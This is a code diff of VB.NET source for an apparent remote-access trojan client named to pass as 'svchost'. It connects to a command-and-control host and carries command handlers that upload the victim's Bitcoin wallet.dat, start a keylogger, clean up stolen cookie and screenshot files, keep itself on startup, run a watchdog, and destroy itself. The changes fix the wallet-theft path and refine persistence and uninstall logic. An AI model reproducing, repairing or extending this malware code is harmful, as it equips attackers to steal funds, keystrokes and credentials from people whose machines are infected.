@@ -34,7 +34,6 @@ Imports svchost.Spreads
 Public Class Form1
     Public Host As String = "[HOST]"
     Public ID As String = "[ID]"
-    Public Password As String = "[C_Password]"
     Public Startup As String = "[Startup]"
     Public HardInstall As String = "[HardInstall]"
     Public StartName As String = "[StartupName]"
@@ -72,6 +71,7 @@ Public Class Form1
             If checkBlacklist() = True Then
                 C.Send("Uninstall")
                 DStartup(StartName)
+                SelfDestroy()
                 Application.Exit()
             End If
 
@@ -90,6 +90,7 @@ Public Class Form1
                     Return
                 Else
                     Process.Start(TempPath & "\updatedpayload.exe")
+                    SelfDestroy()
                     Application.Exit()
                 End If
             End If
@@ -103,20 +104,14 @@ Public Class Form1
             Else
                 If RSAStatus = "True" Then
                     C.Host = RSA_Decrypt(Host, RSAKey)
-                    C.C_Password = RSA_Decrypt(Password, RSAKey)
                 Else
                     C.Host = Host
-                    C.C_Password = Password
                 End If
             End If
 
             C.ID = ID & "_" & HWD()
-            If C.Connect() = True Then
-                C.Send("Online")
-            Else
-                SelfDestroy()
-                Application.Exit()
-            End If
+            C.Connect()
+            C.Send("Online")
 
             Dim t As New Thread(Sub() IND(True))
             t.IsBackground = True
@@ -190,7 +185,6 @@ Public Class Form1
             End If
 
             If WatcherStatus = "True" Then
-
                 Watchdog.NewWatchdog(WatcherBytes)
             End If
 
@@ -472,6 +466,7 @@ Public Class Form1
                             C.Log("Succ", "Connection closed")
                             C.Send("Offline")
                             If WatcherStatus = "True" Then
+                                Watchdog.KeepRunning = False
                                 Watchdog.StopWatcher(False)
                             End If
                             Application.Exit()
@@ -528,6 +523,13 @@ Public Class Form1
                             My.Settings.moveStatus = True
                             My.Settings.newHost = A(1)
                             My.Settings.Save()
+                            If (Startup = "True") Then
+                                DStartup(StartName)
+                            End If
+                            If WatcherStatus = "True" Then
+                                Watchdog.KeepRunning = False
+                                Watchdog.StopWatcher(True)
+                            End If
                             C.Log("Succ", "Client has been moved to the new host")
                             C.Send("Uninstall")
                             Application.Restart()
@@ -540,6 +542,13 @@ Public Class Form1
                         Try
                             My.Settings.blacklist = True
                             My.Settings.Save()
+                            If (Startup = "True") Then
+                                DStartup(StartName)
+                            End If
+                            If WatcherStatus = "True" Then
+                                Watchdog.KeepRunning = False
+                                Watchdog.StopWatcher(True)
+                            End If
                             C.Send("Uninstall")
                             C.Log("Succ", "Client has been blacklisted")
                             Application.Exit()
@@ -578,8 +587,8 @@ Public Class Form1
 
                     Case "StealBitcoin"
                         Try
-                            If (File.Exists(Environ("%appdata%" & "\" & "Bitcoin\wallet.dat"))) Then
-                                C.Upload(Environ("%appdata%" & "\" & "Bitcoin\wallet.dat"))
+                            If (File.Exists(Environ("appdata") & "\" & "Bitcoin\wallet.dat")) Then
+                                C.Upload(Environ("appdata") & "\" & "Bitcoin\wallet.dat")
                                 C.Send("CleanCommands")
                                 C.Log("Succ", "Bitcoin Wallet has been uploaded")
                             Else
@@ -589,8 +598,6 @@ Public Class Form1
                         Catch ex As Exception
                             C.Log("Fail", "An unexpected error occurred " & ex.Message)
                         End Try
-
-
 
                     Case "StartKeylogger"
                         tt.IsBackground = True
@@ -619,6 +626,7 @@ Public Class Form1
                     Case "CleanTemp"
                         Dim filelist() As String = {"ProgramList.txt", C.ENB(ID & "_" & HWD()) & ".png", "CookiesCh.sqlite", "cookies.sqlite"}
                         TempCleaner(filelist)
+                        C.Send("CleanCommands")
 
                     Case "UpdateClient"
                         UpdateClient(A(1))
